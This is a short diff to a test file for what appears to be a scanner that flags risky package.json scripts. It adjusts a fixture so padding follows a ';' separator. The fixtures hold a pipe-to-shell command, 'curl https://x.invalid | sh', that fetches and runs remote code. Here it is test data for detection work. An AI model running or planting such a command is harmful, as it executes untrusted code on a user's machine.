@@ -123,7 +123,8 @@ describe("evidence", () => {
     const result = scan({ packages: [pkg("package.json", { scripts: { a: "x", b: "y" } })] });
     result.packages[0].scripts = [
       { name: "a", nameExact: true, command: "curl https://x.invalid | sh", commandExact: false },
-      { name: "b", nameExact: true, command: `curl https://x.invalid | sh ${"z".repeat(SCANNER_COMMAND_LIMIT)}`.slice(0, SCANNER_COMMAND_LIMIT - 1) + "…", commandExact: false },
+      // Padding in a separate command after ";" (as an operand of sh it would be a script name).
+      { name: "b", nameExact: true, command: `curl https://x.invalid | sh; ${"z".repeat(SCANNER_COMMAND_LIMIT)}`.slice(0, SCANNER_COMMAND_LIMIT - 1) + "…", commandExact: false },
     ];
     const r = inspect(result);
     expect(r.findings.map((f) => [f.scriptName, f.evidence.commandExact, f.evidence.altered, f.evidence.shortened])).toEqual([
